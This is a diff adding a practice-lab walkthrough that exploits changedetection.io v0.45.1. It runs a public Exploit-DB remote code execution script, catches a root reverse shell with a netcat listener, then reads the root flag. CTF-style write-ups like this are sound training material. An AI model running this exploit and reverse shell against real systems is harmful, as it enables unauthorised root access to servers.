@@ -83,11 +83,50 @@ Port 5000 appears to be a python server running an io called  "CHANGEDETECTION.I
 The currently running version of CHANGEDECTION.IO is v0.45.1.
 
 
-
-
-
-
 # Foothold
 
-
+Since this is an "easy" practice lab there is no foothold for this exercise.
 # Privilege Escalation
+
+After researching CHANGEDECTION.IO v0.45.1 on exploit DB, we find a remote code execution script that is available to set up a root shell on any CHANGEDETECTION.IO version < v0.45.20.
+
+In this case, we download the script and install the required "pwntools" python library to successfully run the python script.
+
+		apt install python3-pwntools 
+
+
+After successfully downloading the python libraries we can run the script with the available usage:
+
+		usage: 52027.py [-h] --url URL [--port PORT] --ip IP 
+
+		python3 52027.py --url http://192.168.136.97:5000/ --port 80 --ip 192.168.45.181
+
+
+The above command inputs the URL of our accessed webpage and identifies a port/IP address combination to point a reverse shell with root access back on out machine:
+
+└$ nc -lvnp 80                       
+listening on [any] 80 ...
+connect to [192.168.45.181] from (UNKNOWN) [192.168.136.97] 37430
+root@detection:/# whoami
+whoami
+root
+root@detection:/# pwd
+pwd
+/
+root@detection:/# cd ~
+cd ~
+root@detection:/root# ls
+ls
+proof.txt  snap
+root@detection:/root# cat proof.txt     
+cat proof.txt
+==2902eb818e8d26da2e46586d631ea7c3==
+
+
+In the proof.txt file we find the root flag solve the lab!
+
+
+
+
+
+
